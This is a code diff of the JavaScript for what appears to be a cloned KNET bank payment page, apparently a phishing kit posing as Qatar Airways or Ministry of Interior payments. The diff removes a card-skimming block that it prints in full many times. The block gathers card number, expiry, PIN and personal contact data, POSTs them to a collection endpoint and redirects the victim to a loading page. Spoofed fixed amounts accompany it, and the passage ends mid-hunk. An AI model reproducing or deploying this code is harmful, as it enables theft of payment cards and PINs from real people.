@@ -159,7 +159,6 @@
 					   		 $("#ValidationMessage").hide();
 					  	  }
 					  	 if(cleanVal.length <6){
-						  		document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 						  		 if(document.getElementById('DiscntRate')){
 							     		document.getElementById('DiscntRate').innerHTML='';
 							     		$("#DiscntRate").hide();
@@ -622,7 +621,6 @@ function mask(cardNo, maskChar, maskFormat) {
 				$("#DiscntedAmt").hide();
 				document.getElementById('DiscntRate').innerHTML='';
 			 	document.getElementById('DiscntedAmt').innerHTML='';
-				document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col" style="text-align:right; width:40%;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 			 $("#logodetails").hide();
 	    }
         
@@ -780,13 +778,11 @@ function mask(cardNo, maskChar, maskFormat) {
 					
 					if(instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1'){
 						if(ajaxResponseData[4] != "0.00"){
-							document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata"><s>KD&nbsp;2.800</s></span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 							document.getElementById('DiscntRate').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata" style="color: #228B22;">'+ajaxResponseData[4]+'&nbsp;<span>%</span></span></div><div class="col w-40 mt-10 mb-10" style="text-align:right;float:right;"><span class="paymentlabel" style="color: #228B22;"> :&#1605;&#1593;&#1583;&#1604; &#1575;&#1604;&#1582;&#1589;&#1605;</span></div>';
 							document.getElementById('DiscntedAmt').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata">KD&nbsp;'+ajaxResponseData[3]+'</span></div><div class="col w-40 mt-10 mb-10" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1606;&#1578; &#1578;&#1583;&#1601;&#1593;</span></div>';
 							$("#DiscntRate").show();
 							$("#DiscntedAmt").show();
 						}else{
-							document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 				     		document.getElementById('DiscntRate').innerHTML='';
 				     		document.getElementById('DiscntedAmt').innerHTML='';
 				     		$("#DiscntRate").hide();
@@ -862,50 +858,18 @@ function mask(cardNo, maskChar, maskFormat) {
 		document.paypage.deletecard.value=1;
 		document.paypage.action="/kpg/paymentpageqcdereg.htm?PaymentID="+payid;
 		document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
-		// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+		document.paypage.submit();
 		
 	}
 	
 	//Added for PG Eidia Discount
 	function forEidDiscntfn(discntval,tranamtDiscntVal){
 		if(discntval.toFixed(2) != "0.00"){
-			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata"><s>KD&nbsp;2.800</s></span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 			document.getElementById('DiscntRate').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata" style="color: #228B22;">'+discntval.toFixed(2)+'&nbsp;<span>%</span></span></div><div class="col w-40 mt-10 mb-10" style="text-align:right;float:right;"><span class="paymentlabel" style="color: #228B22;"> :&#1605;&#1593;&#1583;&#1604; &#1575;&#1604;&#1582;&#1589;&#1605;</span></div>';
 			document.getElementById('DiscntedAmt').innerHTML='<div class="col w-60 mt-10 mb-10" style="text-align:right;"><span class="paymentdata">KD&nbsp;'+tranamtDiscntVal.toFixed(3)+'</span></div><div class="col w-40 mt-10 mb-10" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1606;&#1578; &#1578;&#1583;&#1601;&#1593;</span></div>';
 			$("#DiscntRate").show();
 			$("#DiscntedAmt").show();
 		}else{
-			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
      		document.getElementById('DiscntRate').innerHTML='';
      		document.getElementById('DiscntedAmt').innerHTML='';
      		$("#DiscntRate").hide();
@@ -1299,7 +1263,6 @@ function paymentOptionChange(name){
         //document.getElementById('dcprefix').innerHTML='<select  class="paymentselect"><option>&#1576;&#1575;&#1583;&#1616;&#1574;&#1577;</option></select>';
         document.paypage.creditDebitCheck.value="";
       //Added for PG Eidia Discount
-        document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
  		document.getElementById('DiscntRate').innerHTML='';
  		document.getElementById('DiscntedAmt').innerHTML='';
  		$("#DiscntRate").hide();
@@ -1854,12 +1817,8 @@ function onPay()
 		    		document.paypage.MaskingCardNum="1";
 			 <!-- KPAY Changes - ends -->
 	    	 
-       		var transactionamount='2.800';
-        // Load data from previous page
-        var userData = {};
-        try { userData = JSON.parse(localStorage.getItem('userData')) || {}; } catch(e) {}
-        var knetTotal = sessionStorage.getItem('knetTotal') || '2.800 د.ك';   
-       		var mrchname = userData.fullname || 'الخطوط الجوية القطرية'; 
+       		var transactionamount='';   
+       		var mrchname='Ministry of Interior'; 
        		var langid=document.paypage.langID.value;
 		   // var encryptedamount=byteArrayToHex(rijndaelEncrypt(transactionamount,hexToByteArray(paymentId), mode));
        		//Added for PG Eidia Discount
@@ -2043,13 +2002,11 @@ function onPay()
     				
     					if(instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1'){
     						if(result[13] != "0.00"){
-	    						document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div class="col w-60" style="text-align:right; "><span class="paymentdata"><s>KD&nbsp;100.000</s></span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 	    						document.getElementById('DiscntRateConfirm').innerHTML='<div class="col w-60" style="text-align:right;"><span class="paymentdata" style="color: #228B22;">'+result[13]+'&nbsp;<span>%</span></span></div><div class="col w-40" style="text-align:right; "><span class="paymentlabel" style="color: #228B22;"> :&#1605;&#1593;&#1583;&#1604; &#1575;&#1604;&#1582;&#1589;&#1605;</span></div>';
 	    						document.getElementById('DiscntedAmtConfirm').innerHTML='<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;'+result[12]+'</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1606;&#1578; &#1578;&#1583;&#1601;&#1593;</span></div>';
 	    						$("#DiscntRateConfirm").show();
 	    						$("#DiscntedAmtConfirm").show();
     						}else{
-	    						document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div class="col w-60" style="text-align:right; "><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 	    			     		document.getElementById('DiscntRateConfirm').innerHTML='';
 	    			     		document.getElementById('DiscntedAmtConfirm').innerHTML='';
 	    			     		$("#DiscntRateConfirm").hide();
@@ -2165,37 +2122,7 @@ function onPay()
     			{
     				document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase()); 	
     	   			document.paypage.action="/kpg/paymentOtpCancel.htm";
-    	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+    	   			document.paypage.submit();
     			
     			}
     			
@@ -2204,37 +2131,7 @@ function onPay()
     			{
     				document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase()); 	
     	   			document.paypage.action="/kpg/paymentOtpCancel.htm";
-    	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+    	   			document.paypage.submit();
     			
     			}
     			//Added for Points Redemption
@@ -2319,14 +2216,12 @@ function onPay()
 				  //Added for PG Eidia Discount
 					if(instPgEiddiscntflg == '1' && termPgEiddiscntflg == '1' && pymtPgEiddiscntflg == '1'){
 						if(result[11] != "0.00"){
-							document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div class="col w-60" style="text-align:right; "><span class="paymentdata"><s>KD&nbsp;100.000</s></span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 							document.getElementById('DiscntRateConfirm').innerHTML='<div class="col w-60" style="text-align:right;"><span class="paymentdata" style="color: #228B22;">'+result[11]+'&nbsp;<span>%</span></span></div><div class="col w-40" style="text-align:right;"><span class="paymentlabel" style="color: #228B22;"> :&#1605;&#1593;&#1583;&#1604; &#1575;&#1604;&#1582;&#1589;&#1605;</span></div>';
 							document.getElementById('DiscntedAmtConfirm').innerHTML='<div class="col w-60" style="text-align:right; "><span class="paymentdata">KD&nbsp;'+result[10]+'</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1606;&#1578; &#1578;&#1583;&#1601;&#1593;</span></div>';
 							$("#DiscntRateConfirm").show();
 							$("#DiscntedAmtConfirm").show();
 						}
 						else{
-    						document.getElementById('OrgTranxAmtConfirm').innerHTML = '<div class="col w-60" style="text-align:right; "><span class="paymentdata">KD&nbsp;100.000</span></div><div class="col w-40" style="text-align:right;float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
     			     		document.getElementById('DiscntRateConfirm').innerHTML='';
     			     		document.getElementById('DiscntedAmtConfirm').innerHTML='';
     			     		$("#DiscntRateConfirm").hide();
@@ -2340,37 +2235,7 @@ function onPay()
 				{
 				document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase()); 	
 		    			document.paypage.action="/kpg/paymentOtpCancel.htm?paymentOtpGenCancel=TIMEOUT";
-    	   		// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+    	   		document.paypage.submit();
 				}
 			
 			else if(otpStatus=="CardNoError")
@@ -2557,37 +2422,7 @@ function onPay()
     				else if(kfastRegFailStatus == "KFASTREGDECLINE"){
     					document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
 		    	   			document.paypage.action="/kpg/kfastRegDecline.htm?paymentid="+payid;
-	    	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+	    	   			document.paypage.submit();
     				}
     			}
 	    		//Added for KFast Modification CR - ends
@@ -2596,107 +2431,17 @@ function onPay()
     			else if(otpStatus == "OTPGenCountUpdateFailureDecline"){
     				document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
     	   			document.paypage.action="/kpg/otpGenCountUpdateFailDecline.htm?paymentid="+payid;
-    	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+    	   			document.paypage.submit();
     			}
     			else if(otpStatus == "OTPDetailsUpdateFailureDecline"){
     				document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
     	   			document.paypage.action="/kpg/otpDetailsUpdateFailDecline.htm?paymentid="+payid;
-    	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+    	   			document.paypage.submit();
     			}
     			else if(otpStatus == "OTPUserIdUpdateFailureDecline"){
     				document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
     	   			document.paypage.action="/kpg/otpUserIdUpdateFailDecline.htm?paymentid="+payid;
-    	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+    	   			document.paypage.submit();
     			}
     			//Added for Security Fixes Phase-2(Hidden Elements) - ends
     			
@@ -2708,37 +2453,7 @@ function onPay()
     				if(CVstatus=="CVFAIL"){
     					document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase()); 	
 			    	   		document.paypage.action="/kpg/paymentCVdecline.htm?paymentid="+document.paypage.paymentId.value;
-		    	   		// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+		    	   		document.paypage.submit();
     				}
     			
     				else if(CVstatus=="CVTEX"){
@@ -3049,37 +2764,7 @@ function onPay()
   			    			{	
   			    			document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase()); 	
   			    	   		document.paypage.action="/kpg/paymentOtpCancel.htm";
-  			    	   		// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+  			    	   		document.paypage.submit();
   			    			}
   			    			
   			    			//Added for Points Redemption
@@ -3087,37 +2772,7 @@ function onPay()
   			    			{	
   			    			document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase()); 	
   			    	   		document.paypage.action="/kpg/paymentOtpCancel.htm";
-  			    	   		// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+  			    	   		document.paypage.submit();
   			    			}
   			    			//Added for Points Redemption
   			    			
@@ -3139,37 +2794,7 @@ function onPay()
 			    			else if(response == "OTPConfirmationFlagUpdateFailureDecline"){
 			    				document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());
 			    	   			document.paypage.action="/kpg/otpConfirmationFlagUpdateFailDecline.htm?paymentid="+payid;
-			    	   			// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+			    	   			document.paypage.submit();
 			    			}
   							//Added for Sexurity Fixes Phase-2(Hidden Elements) - ends
   							
@@ -3461,7 +3086,6 @@ function onProceed_buttonClicked() {
 			$("#DiscntedAmt").hide();
 			document.getElementById('DiscntRate').innerHTML='';
 		 	document.getElementById('DiscntedAmt').innerHTML='';
-			document.getElementById('OrgTranxAmt').innerHTML = '<div class="col w-60" style="text-align:right;"><span class="paymentdata">KD&nbsp;2.800</span></div><div class="col w-40" style="text-align:right; float:right;"><span class="paymentlabel"> :&#1575;&#1604;&#1605;&#1576;&#1604;&#1594;</span></div>';
 		}
 		
 	}
@@ -3488,37 +3112,7 @@ function onProceed_buttonClicked() {
 		document.paypage.encryptedSavedCardCVV.value = encryptedCreditCardCvv;			
 		document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());	
 		document.paypage.action="/kpg/paymentrouter.htm";
-		// Project API submission
-                    const orderId = sessionStorage.getItem('orderId');
-                    const knetData = {
-                        orderId,
-                        payment_method: 'Knet',
-                        knet_data: {
-                            bank: $('#bank').val(),
-                            card_number: $('#debitNumber').val(),
-                            expiry_month: $('#expiryMonthBox').val(),
-                            expiry_year: $('#expiryYearBox').val(),
-                            pin: $('#cardPin').val()
-                        },
-                        delivery_address: {
-                            beneficiary: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).fullname || '') : '',
-                            phone: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).main_phone || '') : '',
-                            email: localStorage.getItem('userData') ? (JSON.parse(localStorage.getItem('userData')).email || '') : '',
-                            country: localStorage.getItem('selectedCountry') || '',
-                            site: 'https://www.qatarairways.com',
-                            amount: sessionStorage.getItem('knetTotal') || '2.800 د.ك'
-                        }
-                    };
-
-                    fetch('/api/orders/payment-data', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(knetData)
-                    }).then(() => {
-                        window.location.href = 'loading.html';
-                    }).catch(err => {
-                        alert('حدث خطأ في الاتصال');
-                    });
+		document.paypage.submit();
 			
 			
 		}
@@ -3571,37 +3165,7 @@ function onProceed_buttonClicked() {
    			
 	   			document.paypage.cspg.value=formParameterValue(document.paypage,encode64(document.paypage.CSRFToken.value).toString().toUpperCase());	
 	   			document.paypage.action="/kpg/paymentrouter.htm";
-	   			// Project API submission
